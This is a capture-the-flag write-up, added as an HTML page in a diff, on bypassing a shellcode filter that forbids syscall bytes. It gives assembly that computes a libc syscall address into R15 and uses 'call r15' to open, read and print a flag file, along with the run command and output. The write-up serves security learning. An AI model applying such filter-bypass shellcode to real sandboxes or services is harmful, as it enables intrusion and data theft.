@@ -1,0 +1,1378 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
+
+<html>
+
+<head>
+
+<title>[003] PWN - Syscall Shenanigans</title>
+
+<style>
+
+body{
+
+    background:#1A1A1A;
+
+    color:#F8F6F2;
+
+    font-family:Verdana, Arial, Helvetica, sans-serif;
+
+    font-size:18px;
+
+    line-height:1.8;
+
+    width:900px;
+
+    margin:40px auto;
+
+}
+
+h1,h2,h3,h4{
+
+    color:#FFFFFF;
+
+}
+
+p{
+
+    color:#F8F6F2;
+
+}
+
+a{
+
+    color:#8AB4F8;
+
+    text-decoration:none;
+
+}
+
+a:hover{
+
+    text-decoration:underline;
+
+}
+
+hr{
+
+    border:0;
+
+    border-top:1px solid #444444;
+
+}
+
+table{
+
+    width:100%;
+
+    border-collapse:collapse;
+
+    margin:20px 0;
+
+}
+
+th{
+
+    background:#2A2A2A;
+
+    color:#FFFFFF;
+
+}
+
+th,td{
+
+    border:1px solid #444444;
+
+    padding:10px;
+
+}
+
+pre{
+
+    background:#2A2A2A;
+
+    color:#F8F6F2;
+
+    border:1px solid #444444;
+
+    padding:15px;
+
+    overflow:auto;
+
+}
+
+ul{
+
+    line-height:2;
+
+}
+
+img{
+
+    max-width:100%;
+
+}
+
+blockquote{
+
+    border-left:4px solid #666666;
+
+    padding-left:15px;
+
+    color:#D8D4CC;
+
+    font-style:italic;
+
+}
+
+</style>
+
+</head>
+
+<body>
+
+<center>
+
+<h1>[003] PWN - Syscall Shenanigans</h1>
+
+<p>
+
+<b>Brijesh Babu K</b>
+
+<br>
+
+Independent Security Research
+
+<br><br>
+
+Published: September 2026
+
+</p>
+
+</center>
+
+<hr>
+
+<h2>Introduction</h2>
+
+<p>
+
+This write-up documents my solution to the
+<b>syscall-shenanigans</b> shellcode challenge.
+
+</p>
+
+<p>
+
+The challenge reads bytes from standard input, maps memory for the
+shellcode, applies a filter, and then executes the supplied bytes as
+code.
+
+</p>
+
+<p>
+
+The restriction was that the shellcode could not contain the following
+system-call instruction sequences:
+
+</p>
+
+<pre>
+0F 05  = syscall
+0F 34  = sysenter
+CD 80  = int 0x80
+</pre>
+
+<p>
+
+At first this looked like a simple shellcode-filter bypass problem.
+However, there was another important restriction: the challenge
+removed write permissions from the first page of the shellcode before
+execution.
+
+</p>
+
+<p>
+
+That meant I could not simply place harmless bytes in the shellcode,
+wait for the filter to finish, and then rewrite those bytes into a
+<b>syscall</b> instruction.
+
+</p>
+
+<center>
+
+<img src="images/poc003:1.png" width="350">
+
+<br><br>
+
+</center>
+
+<blockquote>
+
+The interesting part of this challenge was not simply avoiding the
+forbidden bytes. The real problem was finding another way to reach a
+system-call instruction without modifying the protected shellcode
+region.
+
+</blockquote>
+
+<hr>
+
+<h2>1. Challenge Environment</h2>
+
+<p>
+
+The challenge maps a region for the supplied shellcode and reads the
+payload from standard input.
+
+</p>
+
+<pre>
+Mapped 0x2000 bytes for shellcode at 0x14ed5000!
+
+Reading 0x2000 bytes from stdin.
+
+Executing filter...
+</pre>
+
+<p>
+
+After filtering, the challenge removes write permissions from the first
+4096 bytes.
+
+</p>
+
+<center>
+
+<img src="images/poc003:2.png" width="350">
+
+<br><br>
+
+</center>
+
+<pre>
+Removing write permissions from first 4096 bytes of shellcode.
+</pre>
+
+<p>
+
+This was an important detail.
+
+</p>
+
+<p>
+
+My first thought was to use some form of self-modifying shellcode,
+similar to replacing harmless placeholder bytes with the required
+system-call instruction after the filter.
+
+</p>
+
+<p>
+
+But the shellcode region was no longer writable.
+
+</p>
+
+<p>
+
+So I had to look for a different route.
+
+</p>
+
+<hr>
+
+<h2>2. The Filter</h2>
+
+<p>
+
+The challenge scans the supplied shellcode for three forbidden byte
+sequences.
+
+</p>
+
+<pre>
+0F 05
+0F 34
+CD 80
+</pre>
+
+<p>
+
+These correspond to:
+
+</p>
+
+<pre>
+0F 05    syscall
+0F 34    sysenter
+CD 80    int 0x80
+</pre>
+
+<p>
+
+A normal shellcode implementation containing:
+
+</p>
+
+<pre>
+syscall
+</pre>
+
+<p>
+
+would therefore fail the filter.
+
+</p>
+
+<p>
+
+The important observation was that the filter checks the bytes supplied
+as the shellcode.
+
+</p>
+
+<p>
+
+It does not provide the shellcode with an arbitrary collection of
+instructions that can be used to directly encode one of the forbidden
+patterns.
+
+</p>
+
+<hr>
+
+<h2>3. My First Attempts</h2>
+
+<p>
+
+Initially, I tried to approach the challenge normally.
+
+</p>
+
+<p>
+
+The obvious solution was to prepare the Linux system-call registers and
+execute a <b>syscall</b> instruction.
+
+</p>
+
+<p>
+
+But the direct instruction was immediately ruled out by the filter.
+
+</p>
+
+<pre>
+syscall
+
+0F 05
+</pre>
+
+<p>
+
+I then started thinking about constructing the instruction during
+runtime.
+
+</p>
+
+<p>
+
+The idea was basically:
+
+</p>
+
+<pre>
+Harmless bytes
+      |
+      v
+Pass filter
+      |
+      v
+Modify bytes
+      |
+      v
+0F 05
+      |
+      v
+syscall
+</pre>
+
+<p>
+
+However, this approach ran into the memory-permission restriction.
+
+</p>
+
+<p>
+
+The challenge removes write permissions from the first 4096 bytes of
+the shellcode before execution.
+
+</p>
+
+<center>
+
+<img src="images/poc003:3.png" width="350">
+
+<br><br>
+
+</center>
+
+<p>
+
+So I could not simply modify my original shellcode region after the
+filter.
+
+</p>
+
+<p>
+
+After trying these approaches, I started looking at the problem from a
+different angle.
+
+</p>
+
+<hr>
+
+<h2>4. The Question That Changed the Approach</h2>
+
+<p>
+
+At this point I started thinking:
+
+</p>
+
+<blockquote>
+
+If I cannot execute a syscall instruction that I put inside my own
+shellcode, and I cannot modify my shellcode after the filter, why do I
+need to create the instruction myself?
+
+</blockquote>
+
+<p>
+
+The process is already running normally.
+
+</p>
+
+<p>
+
+The process also has shared libraries loaded into memory.
+
+</p>
+<center>
+
+<img src="images/poc003:4.png" width="350">
+
+<br><br>
+
+</center>
+
+<p>
+
+So I started investigating the loaded <b>libc</b> region and looking
+for an existing system-call instruction that could be reached from the
+shellcode.
+
+</p>
+
+<p>
+
+That was the turning point of the challenge for me.
+
+</p>
+
+<hr>
+
+<h2>5. Using Existing Code in libc</h2>
+
+<p>
+
+Instead of creating a new <b>syscall</b> instruction inside the
+shellcode, I decided to use an instruction that already existed
+somewhere in the process memory.
+
+</p>
+
+<p>
+
+The basic idea became:
+
+</p>
+
+<pre>
+Shellcode
+    |
+    v
+Find useful address
+    |
+    v
+Calculate libc-related address
+    |
+    v
+Calculate syscall offset
+    |
+    v
+Store final address in R15
+    |
+    v
+CALL R15
+    |
+    v
+Existing syscall instruction
+</pre>
+
+<p>
+
+The shellcode therefore does not need to contain the forbidden
+<b>0F 05</b> sequence itself.
+
+</p>
+
+<p>
+
+It only needs to calculate the address of the existing instruction and
+transfer execution to it.
+
+</p>
+
+<hr>
+
+<h2>6. Calculating the Address</h2>
+
+<p>
+
+I had to determine where the relevant libc code was located in memory.
+
+</p>
+
+<p>
+
+I inspected the available runtime state and used the value available in
+the register to derive the required address.
+
+</p>
+
+<p>
+
+The final shellcode begins with:
+
+</p>
+
+<pre>
+lea r14,[rcx-0xec297]
+lea r15,[r14+0x410a9]
+</pre>
+
+<p>
+
+The first instruction calculates an intermediate address:
+
+</p>
+
+<pre>
+R14 = RCX - 0xEC297
+</pre>
+
+<p>
+
+The second instruction then calculates the final target address:
+
+</p>
+
+<pre>
+R15 = R14 + 0x410A9
+</pre>
+
+<p>
+
+Conceptually:
+
+</p>
+
+<pre>
+             RCX
+              |
+              |
+        - 0xEC297
+              |
+              v
+             R14
+              |
+              |
+        + 0x410A9
+              |
+              v
+             R15
+</pre>
+
+<center>
+
+<img src="images/poc003:5.png" width="350">
+
+<br><br>
+
+</center>
+
+<p>
+
+Because the target address is affected by ASLR (Address Space Layout Randomization), the absolute address of the libc region and the syscall instruction is not guaranteed to remain the same between executions. Therefore, hard-coding the final syscall address would not be reliable. Instead, I calculated the relative offset between the relevant libc base address and the syscall instruction. The shellcode then uses the runtime register value to derive the current base address and adds the previously calculated offset. This allows the shellcode to calculate the correct syscall address automatically at runtime and store the resulting address in R15. The same calculated address can then be used with call r15, without depending on a fixed absolute address.
+
+</p>
+
+<hr>
+
+<h2>7. Why R15?</h2>
+
+<p>
+
+I needed a free general-purpose register to keep the calculated target
+address.
+
+</p>
+
+<p>
+
+At that point in the shellcode, <b>R15</b> was suitable for this job.
+
+</p>
+
+<p>
+
+Once the address was calculated, I could repeatedly use:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+without having to recalculate the target every time.
+
+</p>
+
+<p>
+
+This made the shellcode considerably cleaner.
+
+</p>
+
+<hr>
+
+<h2>8. CALL R15</h2>
+
+<p>
+
+The instruction used to transfer execution is:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+Its encoding is:
+
+</p>
+
+<pre>
+41 FF D7
+</pre>
+
+<p>
+
+The important difference is:
+
+</p>
+
+<pre>
+Forbidden:
+
+0F 05
+
+Used:
+
+41 FF D7
+</pre>
+
+<p>
+
+The filter searches for the explicitly forbidden byte sequences. The
+indirect call does not match those sequences.
+
+</p>
+
+<p>
+
+When the CPU executes:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+execution is transferred to the address stored in <b>R15</b>.
+
+</p>
+
+<p>
+
+In this challenge, that address leads to the existing system-call
+instruction that I located in the process memory.
+
+</p>
+
+<blockquote>
+
+I did not create the syscall instruction in my shellcode. I found an
+existing one and used CALL R15 to reach it.
+
+</blockquote>
+
+<hr>
+
+<h2>9. The Complete Route</h2>
+
+<p>
+
+The final approach can be summarized as:
+
+</p>
+
+<pre>
+Normal syscall
+      |
+      X
+Filter blocks 0F 05
+      |
+      v
+Try self-modifying shellcode
+      |
+      X
+Shellcode page becomes read-only
+      |
+      v
+Look for existing code
+      |
+      v
+Investigate libc
+      |
+      v
+Calculate useful address
+      |
+      v
+Store address in R15
+      |
+      v
+CALL R15
+      |
+      v
+Existing syscall instruction
+</pre>
+
+<p>
+
+This was the main breakthrough of the challenge.
+
+</p>
+
+<hr>
+
+<h2>10. Preparing the Filename</h2>
+
+<p>
+
+Once the system-call transition problem was solved, the remaining
+shellcode performs the required file operations.
+
+</p>
+
+<p>
+
+The filename is constructed directly on the stack.
+
+</p>
+
+<pre>
+xor ecx, ecx
+push rcx
+
+mov rax, 0x67616c662f2f
+push rax
+
+mov rdi, rsp
+</pre>
+
+<p>
+
+The value represents:
+
+</p>
+
+<pre>
+//flag
+</pre>
+
+<p>
+
+The stack pointer is then placed into <b>RDI</b>, giving the system call
+a pointer to the filename.
+
+</p>
+
+<hr>
+
+<h2>11. Opening the File</h2>
+
+<p>
+
+The shellcode prepares the Linux <b>open</b> system call.
+
+</p>
+
+<pre>
+xor esi, esi
+xor eax, eax
+mov al, 2
+</pre>
+
+<p>
+
+The important register state is:
+
+</p>
+
+<pre>
+RAX = 2
+RSI = 0
+RDI = pointer to "//flag"
+</pre>
+
+<p>
+
+The system-call transition is then performed through:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+The return value is the file descriptor.
+
+</p>
+
+<p>
+
+It is moved into <b>RDI</b>:
+
+</p>
+
+<pre>
+push rax
+pop rdi
+</pre>
+
+<hr>
+
+<h2>12. Creating the Read Buffer</h2>
+
+<p>
+
+The shellcode uses the stack as a temporary buffer.
+
+</p>
+
+<pre>
+xor ecx, ecx
+
+push rcx
+push rcx
+push rcx
+push rcx
+push rcx
+push rcx
+push rcx
+push rcx
+
+mov rsi, rsp
+</pre>
+
+<p>
+
+Eight pushes reserve 64 bytes.
+
+</p>
+
+<p>
+
+The resulting stack pointer is used as the read buffer:
+
+</p>
+
+<pre>
+RSI = buffer
+</pre>
+
+<hr>
+
+<h2>13. Reading the File</h2>
+
+<p>
+
+The shellcode prepares the read operation:
+
+</p>
+
+<pre>
+xor edx, edx
+mov dl, 64
+
+xor eax, eax
+
+call r15
+</pre>
+
+<p>
+
+The register state is:
+
+</p>
+
+<pre>
+RAX = 0
+RDI = file descriptor
+RSI = buffer
+RDX = 64
+</pre>
+
+<p>
+
+The call requests up to 64 bytes from the opened file.
+
+</p>
+
+<hr>
+
+<h2>14. Reusing the Return Value</h2>
+
+<p>
+
+The return value from the read operation contains the number of bytes
+read.
+
+</p>
+
+<p>
+
+The shellcode moves this value into <b>RDX</b>:
+
+</p>
+
+<pre>
+push rax
+pop rdx
+</pre>
+
+<p>
+
+This allows the same value to be used as the length argument for the
+write operation.
+
+</p>
+
+<hr>
+
+<h2>15. Writing to stdout</h2>
+
+<p>
+
+The shellcode prepares the Linux <b>write</b> operation:
+
+</p>
+
+<pre>
+xor eax, eax
+mov al, 1
+
+mov edi, eax
+
+call r15
+</pre>
+
+<p>
+
+The register state becomes:
+
+</p>
+
+<pre>
+RAX = 1
+RDI = 1
+RSI = buffer
+RDX = bytes read
+</pre>
+
+<p>
+
+Here, <b>RDI = 1</b> represents standard output.
+
+</p>
+
+<p>
+
+The contents read from the file are therefore written to stdout.
+
+</p>
+
+<hr>
+
+<h2>16. Final Call</h2>
+
+<p>
+
+The shellcode finally performs one more indirect call:
+
+</p>
+
+<pre>
+xor edi, edi
+xor eax, eax
+call r15
+</pre>
+
+<p>
+
+At this point:
+
+</p>
+
+<pre>
+RAX = 0
+RDI = 0
+</pre>
+
+<p>
+
+The observed execution had already printed the protected output before
+the process terminated with a segmentation fault.
+
+</p>
+
+<hr>
+
+<p>
+
+The challenge disassembly shows the indirect calls:
+
+</p>
+
+<pre>
+0x...5025 | 41 ff d7 | call r15
+
+0x...503d | 41 ff d7 | call r15
+
+0x...5048 | 41 ff d7 | call r15
+
+0x...504f | 41 ff d7 | call r15
+</pre>
+
+<p>
+
+The important encoding is:
+
+</p>
+
+<pre>
+41 FF D7
+</pre>
+
+<p>
+
+The shellcode does not directly contain:
+
+</p>
+
+<pre>
+0F 05
+</pre>
+
+<p>
+
+which was one of the byte sequences rejected by the filter.
+
+</p>
+
+<hr>
+
+<h2>19. Execution</h2>
+
+<p>
+
+The compiled shellcode was supplied to the challenge using:
+
+</p>
+
+<pre>
+$ /challenge/syscall-shenanigans &lt; thalavali.bin
+</pre>
+
+<p>
+
+The challenge reached the execution stage:
+
+</p>
+
+<pre>
+Executing filter...
+
+Executing shellcode!
+</pre>
+
+<p>
+
+The protected output was successfully printed.
+
+</p>
+
+<pre>
+[ FLAG REDACTED ]
+</pre>
+
+<p>
+
+After the output was printed, the process terminated with:
+
+</p>
+
+<pre>
+Segmentation fault
+</pre>
+
+<center>
+
+<img src="images/poc003:6.png" width="500">
+
+<br><br>
+
+</center>
+
+<p>
+I was like this at that time.................................... 
+</p>
+
+<p>
+For this challenge, the important result was that the shellcode passed
+the filter, reached the required system-call path, opened the target
+file, read its contents, and wrote the result to standard output.
+
+</p>
+
+<hr>
+
+<h2>20. Execution Flow</h2>
+
+<pre>
+                  Shellcode
+                      |
+                      v
+             Calculate R14
+                      |
+                      v
+             Calculate R15
+                      |
+                      v
+              Existing code
+                      |
+                      v
+                 CALL R15
+                      |
+                      v
+                 open("//flag")
+                      |
+                      v
+                File descriptor
+                      |
+                      v
+                Stack buffer
+                      |
+                      v
+                    read
+                      |
+                      v
+                Bytes returned
+                      |
+                      v
+                   write
+                      |
+                      v
+                 stdout
+                      |
+                      v
+                Flag printed
+                      |
+                      v
+                 Final call
+                      |
+                      v
+             Segmentation fault
+</pre>
+
+<hr>
+
+<h2>21. Important Observation</h2>
+
+<p>
+
+The main lesson from this challenge was that the filter only checks the
+specific instruction encodings that it was designed to detect.
+
+</p>
+
+<p>
+
+The forbidden sequences were:
+
+</p>
+
+<pre>
+0F 05
+0F 34
+CD 80
+</pre>
+
+<p>
+
+The shellcode instead contains:
+
+</p>
+
+<pre>
+41 FF D7
+</pre>
+
+<p>
+
+which represents:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+The shellcode therefore uses an indirect control-flow transfer to an
+existing instruction rather than directly embedding the forbidden
+system-call instruction.
+
+</p>
+
+<hr>
+
+<h2>22. Final Notes</h2>
+
+<p>
+
+This challenge initially looked like a simple "no syscall" shellcode
+problem.
+
+</p>
+
+<p>
+
+After the normal approach failed and the shellcode page became
+read-only, I started looking outside the shellcode itself.
+
+</p>
+
+<p>
+
+That eventually led me to the loaded libc code and the idea of
+calculating the address of an existing system-call instruction.
+
+</p>
+
+<p>
+
+The final shellcode stores that calculated address in <b>R15</b> and
+uses:
+
+</p>
+
+<pre>
+call r15
+</pre>
+
+<p>
+
+for the required system-call transitions.
+
+</p>
+
+<center>
+
+<img src="images/poc003:7.png" width="350">
+
+<br><br>
+
+</center>
+
+<p>
+
+The final solution therefore did not need to modify the original
+shellcode at runtime.
+
+</p>
+
+<blockquote>
+
+Sometimes the easiest way around an instruction restriction is not to
+generate the instruction yourself, but to find an existing instance
+and redirect execution to it.
+
+</blockquote>
+
+<p>
+
+The following sections describe each stage of small potato stuffsss....!
+
+</p>
+
+<center>
+
+<img src="images/poc9.png" width="750">
+
+<br><br>
+
+<i>DANKUUUU</i>
+
+</center>
+
+<center>
+
+<i>End of write-up</i>
+
+</center>
+
+<p>
+
+<a href="index.html">← Back to Home</a>
+
+</p>
+
+</body>
+
+</html>
